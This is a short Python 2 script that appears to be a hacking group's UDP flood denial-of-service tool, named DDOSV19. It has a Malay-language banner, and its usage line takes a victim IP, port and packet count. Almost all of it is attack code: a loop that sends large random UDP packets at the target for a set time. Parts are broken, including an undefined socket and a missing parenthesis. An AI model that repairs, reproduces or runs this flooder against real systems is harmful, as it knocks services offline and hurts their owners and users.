import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#############################################################"
    print "#------------------------VARIANS 19 CREW---------------------#"
    print "#-----------------------------------------------------------#"
    print "# \033[1;91mMenjalankan: ""python2 DDOSV19.py " "<ip> <port> <packet> \033[1;32m#"
    print "# \033[1;91mMenjalankan: ""CONTOH:python2 DDOSV19.py" "51.333.342 80 100 \033[1;32m#" 
    print "#__     __       _     ___       __    ____    ___  _         _       #"
    print "#\ \   / /      / |   / _ \     / _|  |  _ \  | __| \ \      / /      #"
    print "# \ \ / /_____  | |  | (_) |   | |    | |_) | | __|  \ \ /\ / /       #"
    print "#  \ V /|_____| | |  \__,  |   | |_   |  _<   | |_    \ V  V /        #"
    print "#   \_/         |_|     /_/     \__|  |_| \_\ |___|    \_/\_/         #"
    print "#                                                                     #"
    print "#                                                                     #"
    print "#                    \033[1;91m<--LEADER:KUACIBASI-->                 \033[1;32m#"
    print "#############################################################"
    print "                        CREATOR:MR.ASHFLYY"
    print "                       #WE ARE MALAYSIAN HACKER"
    print "                       #WE ARE MUSLIM HACKER"
def flood(victim, vport, duration):
   
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMULA \033[1;32m%s \033[1;91mMENGHANTAR SETAN \033[1;32m%s \033[1;91mMELALUI PORT \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3])

if __name__ == '__main__':
    main()

